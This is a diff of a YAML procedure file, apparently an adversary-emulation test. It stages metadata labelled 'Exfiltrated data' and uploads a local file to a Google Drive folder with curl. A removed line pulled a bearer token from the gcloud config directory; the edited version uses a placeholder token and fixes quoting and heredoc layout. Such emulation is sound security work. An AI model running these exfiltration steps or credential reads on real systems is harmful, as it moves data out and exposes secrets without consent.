@@ -34,9 +34,9 @@ steps:
   - name: Verify file exists
     type: command
     executor: bash
-    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    command: "test -f '{{ args.file_path }}' || (echo 'File not found'; exit 1)"
     cleanup: false
-  
+
   - name: Check Google Drive access
     type: command
     executor: bash
@@ -52,13 +52,13 @@ steps:
     executor: bash
     command: |
       cat > /tmp/drive_metadata.json << 'JSON_EOF'
-{
-  "name": "$(basename '{{ args.file_path }}')",
-  "description": "{{ args.file_description }}",
-  "parents": ["{{ args.drive_folder_id }}"],
-  "mimeType": "application/octet-stream"
-}
-JSON_EOF
+      {
+        "name": "test_file",
+        "description": "Exfiltrated data",
+        "parents": ["1a2B3c4D5e6F7g8H9i0J"],
+        "mimeType": "application/octet-stream"
+      }
+      JSON_EOF
       echo "Upload metadata prepared"
     cleanup: false
   
@@ -74,22 +74,22 @@ JSON_EOF
         echo "Folder ID: {{ args.drive_folder_id }}"
       else
         curl -X POST \
-          -H "Authorization: Bearer $(cat ~/.config/gcloud/token 2>/dev/null || echo 'TOKEN')" \
-          -F "metadata=@/tmp/drive_metadata.json;type=application/json" \
+          -H 'Authorization: Bearer TOKEN' \
+          -F 'metadata=@/tmp/drive_metadata.json;type=application/json' \
           -F "file=@'{{ args.file_path }}'" \
-          "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
+          'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart'
       fi
     cleanup: false
 checks:
   - name: File accessible
     description: Verify file is readable
     type: command
-    command: test -r '{{ args.file_path }}'
-  
+    command: "test -r '{{ args.file_path }}'"
+
   - name: Valid folder ID
     description: Verify Google Drive folder ID format
     type: command
-    command: echo '{{ args.drive_folder_id }}' | grep -qE '^[a-zA-Z0-9_-]+$' && echo "Valid folder ID"
+    command: "echo '{{ args.drive_folder_id }}' | grep -qE '^[a-zA-Z0-9_-]+$' && echo 'Valid folder ID'"
 tests:
   dry_run:
     - name: Test Google Drive upload (dry-run)
@@ -100,17 +100,17 @@ tests:
           type: command
           executor: bash
           command: echo "Google Drive test data" > /tmp/test_drive.dat
-        
+
         - name: Prepare metadata
           type: command
           executor: bash
           command: |
-            cat > /tmp/drive_meta.json << 'JSON'
-{
-  "name": "test_drive.dat",
-  "parents": ["1a2B3c4D5e6F7g8H9i0J"]
-}
-JSON
+            cat > /tmp/drive_meta.json << 'JSON_METADATA'
+            {
+              "name": "test_drive.dat",
+              "parents": ["1a2B3c4D5e6F7g8H9i0J"]
+            }
+            JSON_METADATA
         
         - name: Show upload preparation
           type: command
